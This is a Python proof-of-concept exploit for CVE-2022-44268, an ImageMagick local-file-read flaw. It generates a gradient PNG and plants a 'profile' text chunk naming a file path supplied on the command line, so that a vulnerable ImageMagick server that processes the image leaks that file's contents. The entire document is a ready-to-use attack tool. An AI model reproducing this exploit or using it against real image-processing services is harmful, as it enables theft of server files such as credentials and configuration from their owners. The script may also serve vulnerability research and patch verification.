import argparse
import os
import time
from PIL import Image, PngImagePlugin
import png

def generate_gradient_png():
    width = 255
    height = 255
    img = []
    for y in range(height):
        row = ()
        for x in range(width):
            row = row + (x, max(0, 255 - x - y), y)
        img.append(row)
    
    with open('gradient.png', 'wb') as f:
        w = png.Writer(width, height, greyscale=False)
        w.write(f, img)
    return 'gradient.png'

def embed_payload_to_png(local_file, output_file):
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", local_file)
    im = Image.open(generate_gradient_png())
    im.save(output_file, "PNG", pnginfo=info)
    os.remove('gradient.png')

def main():
    print("\n   [\u001b[32;1m>\u001b[0m] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>")
    parser = argparse.ArgumentParser(description='imagemagick-LFI : PoC for CVE-2022-44268')
    parser.add_argument('-f', '--lfile', help='Local file to read', required=True)
    parser.add_argument('-o', '--output', help='Output png file', required=True)
    args = parser.parse_args()
    
    time.sleep(0.2)
    print("   [\u001b[32;1m>\u001b[0m] Generating Blank PNG")
    time.sleep(0.2)
    
    try:
        embed_payload_to_png(args.lfile, args.output)
        time.sleep(0.2)
        print(f"   [\u001b[32;1m>\u001b[0m] PoC PNG generated > {args.output}")
    except Exception as e:
        print(f"   [\u001b[31;1m!\u001b[0m] Error: {e}")

if __name__ == '__main__':
    main()
